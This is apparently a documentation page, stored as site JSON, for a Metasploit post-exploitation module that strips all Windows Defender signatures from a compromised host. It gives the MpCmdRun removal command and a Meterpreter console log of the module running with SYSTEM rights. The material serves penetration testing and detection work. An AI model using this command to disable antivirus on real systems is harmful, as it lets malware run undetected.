{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/manage/rollback_defender_signatures","result":{"data":{"moduleMetadataJson":{"id":"2de065ae-2f4d-5203-8d41-c8ee3bd5aa17","name":"Disable Windows Defender Signatures","fullname":"post/windows/manage/rollback_defender_signatures","description":"This module with appropriate rights let to use the Windows Defender command-line utility a run and automation\n        tool (mpcmdrun.exe) in order to disable all the signatures available installed for the compromised machine.\n        The tool is prominently used for scheduling scans and updating the signature or definition files,\n        but there is a switch created to restore the installed signature definitions to a previous backup copy or\n        to the original default set of signatures which is none, disabling all the signatures and allowing malware\n        to execute even with the Windows Defender solution enabled.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/manage/rollback_defender_signatures","documentationSlug":"/modules/documentation/post/windows/manage/rollback_defender_signatures"},"documentation":{"html":"<p>This module requires system privs</p>\n<p>This module rolls back the signatures in windows defender to the\nearliest signatures.  The level of protection is somewhat indeterminate.\nThis action is accomplished by running the command:\n<code class=\"language-text\">MpCmdRun.exe -RemoveDefinitions -All</code></p>\n<p>To recover, you can run\n<code class=\"language-text\">MpCmdRun.exe -UpdateSignatures</code>\nThat will force defender to update the signatures to the latest version\nfrom </p>\n<h3 id=\"vulnerable-applications\" style=\"position:relative;\"><a href=\"#vulnerable-applications\" aria-label=\"vulnerable applications permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Applications</h3>\n<p>Windows defender is the target, though this is a feature</p>\n<h3 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 post(windows/manage/rollback_defender_signatures) &gt; sessions -i -1\n[*] Starting interaction with 3...\n\nmeterpreter &gt; sysinfo\nComputer        : WIN-5ADJK2NT7IJ\nOS              : Windows 7 (Build 7600).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; background\n[*] Backgrounding session 3...\nmsf5 post(windows/manage/rollback_defender_signatures) &gt; show options\n\nModule options (post/windows/manage/rollback_defender_signatures):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   ACTION   Update           yes       Action to perform (Update/Rollback) (Accepted: Rollback, Update)\n   SESSION  3                yes       The session to run this module on.\n\nmsf5 post(windows/manage/rollback_defender_signatures) &gt; set action rollback\naction =&gt; rollback\nmsf5 post(windows/manage/rollback_defender_signatures) &gt; set verbose true\nverbose =&gt; true\nmsf5 post(windows/manage/rollback_defender_signatures) &gt; show options\n\nModule options (post/windows/manage/rollback_defender_signatures):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   ACTION   rollback         yes       Action to perform (Update/Rollback) (Accepted: rollback, update)\n   SESSION  3                yes       The session to run this module on.\n\nmsf5 post(windows/manage/rollback_defender_signatures) &gt; run\n\n[*] program_path = C:\\Program Files\n[*] file_path = C:\\Program Files\\Windows Defender\\MpCmdRun.exe\n[*] Removing All Definitions for Windows Defender\n[*] rollback\n[*] Running cmd.exe /c &quot;C:\\Program Files\\Windows Defender\\MpCmdRun.exe&quot; -RemoveDefinitions -All\n[*] \nService Version: 6.1.7600.16385\nEngine Version: 1.1.15400.5\nAntiSpyware Signature Version: 1.281.1013.0e[*] Post module execution completed\n\n### Options\nModule options (post/windows/manage/rollback_defender_signatures):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   ACTION   rollback         yes       Action to perform (Update/Rollback) (Accepted: rollback, update)\n   SESSION  3                yes       The session to run this module on.\n\nSession is standard\nACTION is what you would like to do.  Rollback rolls the definitions\nback to the original, update updates the signatures.  In theory, on\na normal system, rollback will push to old definitions, and update will\nreturn the definitions.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"2de065ae-2f4d-5203-8d41-c8ee3bd5aa17"}}}